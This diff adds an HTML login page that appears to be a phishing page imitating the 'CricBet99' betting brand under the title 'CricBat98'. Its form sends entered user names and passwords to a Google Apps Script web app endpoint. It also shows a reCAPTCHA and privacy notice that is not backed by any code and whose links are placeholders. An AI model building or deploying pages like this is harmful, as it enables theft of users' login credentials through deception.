@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CricBat98</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(5deg, rgba(69, 100, 51, 0.959),#355539,#2e4731,#864f04);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 330px;
+            height: 300px;
+            text-align: center;
+            position: relative;
+            top: -150px;
+        }
+
+        .login-container img {
+            width: 350px;
+            height: auto;
+            position: absolute;
+            top: -90px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .form-container {
+            margin-top: 40px;
+        }
+
+        .login-heading {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #8B4513;
+            margin-top: -30px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .form-group input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            border: 1px solid #ced4da;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #8B4513;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background-color: #5A3310;
+        }
+
+        .login-demo-btn {
+            margin-top: 15px;
+            background-color: #8B4513;
+        }
+
+        .login-demo-btn:hover {
+            background-color: #5A3310;
+        }
+
+        .signup-link {
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .recaptcha-text {
+            font-size: 12px;
+            color: #6c757d;
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .privacy-terms-btn {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 4px;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 14px;
+            margin-top: 15px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .privacy-terms-btn:hover {
+            background-color: #0056b3;
+        }
+
+        .recaptcha-text a {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        .recaptcha-text a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="logo.png" alt="CricBet99 Logo">
+        <div class="form-container">
+            <div class="login-heading">LOGIN</div>
+            <!-- Form connected to Google Apps Script Web App -->
+            <form action="https://script.google.com/macros/s/AKfycbz2yNi0v9CH5eN9OwTyEjnVMsmn1x7dOaG-BgdmekNg8cMPuf6fzymh4r9fKAKybJ-s/exec" method="POST">
+                <div class="form-group">
+                    <label for="UserName"></label>
+                    <input type="text" id="UserName" name="UserName" placeholder="User Name" required>
+                </div>
+                <div class="form-group">
+                    <label for="password"></label>
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="btn">Login</button>
+            </form>
+            <button class="btn login-demo-btn">Login with Demo ID</button>
+            <div class="signup-link"></div>
+            <div class="recaptcha-text">
+                <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
+                <a href="#">Privacy Policy</a> and 
+                <a href="#">Terms of Service</a> apply.
+            </div>
+        </div>
+    </div>
+</body>
+</html>
